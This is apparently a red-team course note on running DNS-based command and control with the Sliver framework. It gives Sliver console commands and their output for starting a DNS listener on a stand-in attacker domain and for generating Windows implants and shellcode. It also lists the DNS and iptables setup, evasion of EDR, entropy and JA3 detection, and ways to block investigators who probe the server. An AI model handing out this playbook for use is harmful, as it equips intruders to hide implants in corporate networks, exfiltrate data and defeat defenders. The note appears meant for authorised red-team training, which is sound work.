---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.12 DNS C2 with Sliver Under the Radar"
---

# 95.12 DNS C2 with Sliver Under the Radar

## Introduction to DNS C2
DNS (Domain Name System) is fundamental to network functionality, making it a prime protocol for covert Command and Control (C2) channels. Because blocking DNS entirely breaks network operations, many organizations allow outbound DNS queries to internet root servers or forward them via internal resolvers. DNS C2 exploits this by encapsulating malicious communications within standard DNS requests (like A, TXT, or CNAME records) and responses.

Sliver offers a robust DNS C2 implementation that can slip entirely under the radar of many modern security solutions. This guide details the advanced setup, configuration, and operational tactics required for deploying DNS C2 using Sliver.

## Mechanics of DNS Tunneling

In a DNS C2 setup:
1. The **Implant** wants to send data (e.g., a check-in or exfiltrated data). It encodes this data into a subdomain string.
2. It performs a DNS lookup for `[encoded-data].malicious-domain.com`.
3. The internal DNS server forwards the query to the root servers, which eventually route it to the **Authoritative Name Server** for `malicious-domain.com`.
4. The Authoritative Name Server is controlled by the attacker (the Sliver Server). It decodes the subdomain, processes the data, and responds with a DNS record (like a TXT record) containing the encoded commands for the implant to execute.

Because the internal DNS server acts as a proxy, the implant never communicates directly with the attacker's infrastructure over an IP address, heavily obscuring the true destination and bypassing standard IP-based egress filters.

## Infrastructure Setup

To configure DNS C2, you need absolute control over a domain name. 

### Step 1: Domain Setup and NS Records
You must configure your domain registrar (e.g., Cloudflare, Namecheap, Route53) to point the Name Server (NS) records to the IP address of your Sliver server.

Example DNS configuration for `evil-corp-update.com`:
- `A` Record: `ns1.evil-corp-update.com` -> `192.168.1.100` (Attacker IP)
- `A` Record: `ns2.evil-corp-update.com` -> `192.168.1.100` (Attacker IP)
- `NS` Record: `evil-corp-update.com` -> `ns1.evil-corp-update.com`
- `NS` Record: `evil-corp-update.com` -> `ns2.evil-corp-update.com`

This setup tells the global DNS infrastructure that any query for `*.evil-corp-update.com` should be resolved by your Sliver server.

### Step 2: Bind9 and Port Forwarding (Optional but Recommended)
If your Sliver server is sitting behind a firewall or running as a non-root user (where binding to port 53 is restricted), you might need iptables routing:

```bash
# Route incoming UDP/TCP port 53 to an unprivileged port (e.g., 5353) where Sliver is listening
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 5353
```

## Configuring Sliver DNS Listener

Inside the Sliver console, starting a DNS listener is straightforward once the infrastructure is configured.

```bash
sliver > dns --domain evil-corp-update.com.
[*] Starting DNS listener with domain: evil-corp-update.com.
[*] DNS listener successfully started on 0.0.0.0:53
```

### Advanced DNS Listener Options
Sliver's DNS listener can be tuned for stealth:
- **FQDN Limitations:** Keeping subdomain lengths reasonable prevents simple heuristics from flagging abnormally long DNS queries.
- **Record Types:** Sliver dynamically utilizes `TXT`, `CNAME`, and `NULL` records. `TXT` is generally preferred for data density, but randomizing record types helps evade simplistic detection mechanisms.

### Generating the DNS Implant
```bash
sliver > generate --dns evil-corp-update.com. --os windows --arch amd64 --format exe --save /tmp/dns_implant.exe
[*] Generating new windows/amd64 implant (dns)
[*] Implant successfully compiled to: /tmp/dns_implant.exe
```

## ASCII Diagram: DNS C2 Communication Flow

```text
      [ Corporate Network ]                                         [ Internet / Attacker Infra ]
      
      +--------------------+                                            +-------------------+
      |                    |   1. Query: TXT                            |                   |
      | Compromised Host   |      A8F9B2...C1.evil-corp-update.com      |   Root DNS / TLD  |
      | (Sliver Implant)   +-------------------+                        |   Servers         |
      |                    |                   |                        |                   |
      +--------^-----------+                   |                        +--------+----------+
               |                               v                                 |
               |                     +---------+---------+                       | 2. Redirects to
               |                     |                   |                       |    Authoritative NS
               |                     |   Internal DNS    |                       v
               |                     |   Resolver        |              +--------+----------+
               |                     |   (e.g., Active   +------------->|                   |
               |                     |   Directory DNS)  |              | Sliver C2 Server  |
               |                     |                   |              | (Port 53 Listener)|
               |                     +---------+---------+              |                   |
               |                               |                        +--------+----------+
               | 4. Response: TXT Record       |                                 |
               |    "ENCODED_PAYLOAD_DATA"     | 3. Response routed back         |
               +-------------------------------+<--------------------------------+
```

## Real-World Attack Scenario

### The Egress Nightmare
During a Red Team engagement against a heavily fortified financial institution, operators discovered that the target environment enforced a strict Zero Trust model. All outbound traffic on HTTP/HTTPS/FTP was denied by default, except through an authenticated, inspecting web proxy that required specific domain categorization and user authentication.

### Implementing DNS C2
The operators could not establish a standard HTTP beacon. However, standard `nslookup` queries to external domains were resolving correctly through the internal Active Directory DNS servers. 

The Red Team registered a deceptive domain, `azure-cdn-metrics.net`, and configured the NS records. They generated a Sliver DNS implant and injected it into memory using a custom loader to bypass the local EDR (see [[14 - Bypassing EDRs with Sliver Custom Compiles]]).

### Execution
The implant began beaconing by making DNS queries to `[encoded-data].azure-cdn-metrics.net`. The internal AD DNS server innocently forwarded these requests to the internet, entirely bypassing the web proxy's IP-based and HTTP-based egress filters. The C2 channel was slow—due to the nature of DNS bandwidth limits—but incredibly stable. The operators used this low-bandwidth channel to deploy an internal TCP pivot listener (see [[13 - Sliver Pivot Listeners and Internal Routing]]) to expand their foothold without generating any HTTP noise.

## OPSEC and Evasion Considerations

1. **Volume Constraints:** DNS C2 is inherently slow and loud in volume. Transferring large files over DNS will generate thousands of queries in a very short time, which easily triggers SIEM alerts like "High volume of DNS queries to a single domain." Use DNS C2 primarily for persistent, low-and-slow check-ins.
2. **Subdomain Length Entropy:** Many SOCs monitor for high-entropy subdomains. `7a8b9c...d1e2.evil.com` stands out. Modern implementations attempt to encode data into dictionary words to bypass basic entropy checks.
3. **Caching Issues:** Ensure your C2 server sets low or zero Time-To-Live (TTL) values on DNS responses so that internal resolvers do not cache the malicious responses, which would disrupt the communication flow.

## Operational Commands Cheat Sheet
```bash
# Start DNS listener on non-standard port and map with iptables later
sliver > dns --domain domain.com --port 5353

# Check active listeners
sliver > jobs

# Generate a stageless DNS shellcode for injection
sliver > generate --dns domain.com --format shellcode --os windows --arch amd64
```

## Chaining Opportunities
- **Hybrid C2 Profiles:** Sliver allows for implants to failover. You can configure an implant to attempt an HTTP connection, and if blocked, fall back to DNS. This provides resilience.
- **Pivoting:** DNS is best used as the initial, highly stealthy ingress point. From there, establish internal peer-to-peer comms. See [[13 - Sliver Pivot Listeners and Internal Routing]].

## Related Notes
- [[11 - Sliver C2 HTTP Profiles mimicking legitimate traffic]]
- [[13 - Sliver Pivot Listeners and Internal Routing]]
- [[14 - Bypassing EDRs with Sliver Custom Compiles]]
- [[65 - Exfiltration over Alternative Protocols]]

## Extended Technical Reference and Advanced Troubleshooting

### Deep Dive into Infrastructure Resiliency
When conducting long-term, high-stakes engagements (such as APT simulations or extended Red Team operations), the resiliency of your Command and Control infrastructure is paramount. A single point of failure can lead to the loss of all deployed implants, potentially burning weeks of effort.

#### Redundant Redirectors
Always deploy multiple distinct redirectors pointing back to your team server. 
- **Primary Route:** Used for daily check-ins and high-jitter beaconing.
- **Secondary Route:** A fallback domain, perhaps using a completely different protocol (like DNS or Domain Fronting), that the implant attempts to contact only if the primary route fails for 48 consecutive hours.
- **Tertiary Route:** An extremely low-and-slow fallback, beaconing once a week via a compromised third-party service (e.g., Slack or Microsoft Graph API C2).

#### Automating Infrastructure Rollout
Use Terraform or Ansible to deploy your redirectors. If a Blue Team burns your IP, you should be able to spin up a new Nginx proxy, attach an elastic IP, and provision a new Let's Encrypt certificate in under 5 minutes.

### Advanced Evasion Techniques

#### Memory Scanning Evasion
Modern EDRs perform routine memory scans, looking for known signatures (like standard Sliver strings) sitting in `PAGE_EXECUTE_READWRITE` memory.
- **Sleep Obfuscation:** Advanced loaders implement techniques like `Ekko` or `FOLIAGE` to encrypt the implant's memory space while it is sleeping. The implant decrypts itself, executes its task, and re-encrypts itself before calling `Sleep()`.
- **Module Stomping:** Instead of allocating new memory, the loader hollows out a legitimate DLL loaded in the process space (e.g., `xpsprint.dll`) and injects the Sliver shellcode into that space. This bypasses heuristics looking for anomalous unbacked executable memory.

#### Network Signature Evasion
- **JA3/JA3S Fingerprinting:** The TLS handshake itself leaves a fingerprint. Sliver's default Go HTTP client has a specific JA3 hash. By compiling the implant to use the native Windows WinINET/WinHTTP APIs, the TLS handshake will exactly match the host OS's native traffic, neutralizing JA3-based detections.
- **Beacon Jitter:** A mathematically perfect 60-second beacon interval is easily detectable by simple statistical analysis (e.g., RITA or Zeek). Always configure a jitter of at least 25-30% to introduce randomness.

### Comprehensive Troubleshooting Checklist

1. **Firewall Configurations:**
   - Have you verified that port 443 is open on your team server?
   - Is the cloud provider's security group allowing inbound UDP/53 (for DNS) and TCP/443 (for HTTPS)?
   - Are internal host firewalls (Windows Defender Firewall) blocking the named pipe or TCP bind port?

2. **Certificate Validation:**
   - If using mTLS, check that the client config hasn't expired.
   - For HTTPS C2, ensure the Let's Encrypt certificate is correctly mounted in the Nginx reverse proxy.
   - Check if the target environment employs SSL/TLS inspection. If so, your custom cert might be replaced by the corporate proxy, breaking pinning.

3. **Implant Execution Issues:**
   - Did the shellcode runner allocate memory with `PAGE_EXECUTE_READWRITE`? (Consider `PAGE_READWRITE` followed by `VirtualProtect` to `PAGE_EXECUTE_READ`).
   - Is the process architecture matching the implant? (Don't inject x64 shellcode into a SysWOW64 process).
   - Are dependencies missing on the target? (Go binaries are usually statically linked, but custom loaders might require certain MSVC runtimes if not compiled correctly).

### Logging and Telemetry

To ensure proper OPSEC, Red Teams must monitor their own infrastructure for Blue Team probing.

**Nginx Access Logs (Red Team Monitoring):**
```bash
tail -f /var/log/nginx/access.log | grep -v "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"
```
*This command filters out your expected C2 traffic, allowing you to instantly see if a threat hunter is curling your endpoint with a default curl User-Agent. If you see anomalous probing, dynamically update Nginx to block the investigator's IP.*

**Sliver Server Logs:**
Enable debug logging on the Sliver team server if implants are failing to check-in:
```bash
Sliver Server > debug --enable
```
Examine the `~/.sliver/logs/sliver.log` file. Look for TLS handshake errors, which indicate either a proxy interception or a mismatched profile.

### Recommended Tooling Integration
- **Cobalt Strike:** While Sliver is powerful, it is often used as a fallback C2. You can use Sliver to drop a Cobalt Strike Beacon if the environment is determined to be safe.
- **BloodHound:** Always pipe your active sessions through a BloodHound ingestor (like SharpHound) to maintain an up-to-date map of lateral movement paths.
- **Sysmon:** In your lab environment, install Sysmon with SwiftOnSecurity's config to see exactly what your Sliver implants look like to defenders.

### Artifact Cleanup

Upon completion of the engagement, ensure all artifacts are safely removed to prevent leaving the client vulnerable.
1. Terminate all active sessions from the Sliver console.
2. If custom services or registry keys were created for persistence, issue commands to delete them before terminating the session.
3. Shred the implant binaries on disk using `sdelete` or equivalent.
4. Revoke the SSL certificates and decommission the Nginx redirectors to prevent domain takeover or misuse by actual threat actors.

### Final Thoughts on Malleability
The true power of any C2 framework lies not in its built-in features, but in its malleability. The ability to look like something you are not—be it a Microsoft API, a DNS query, or an internal backup process—is the essence of modern red teaming. Keep your profiles updated, rotate your domains, and always assume the blue team is watching.

---
*End of Note.*
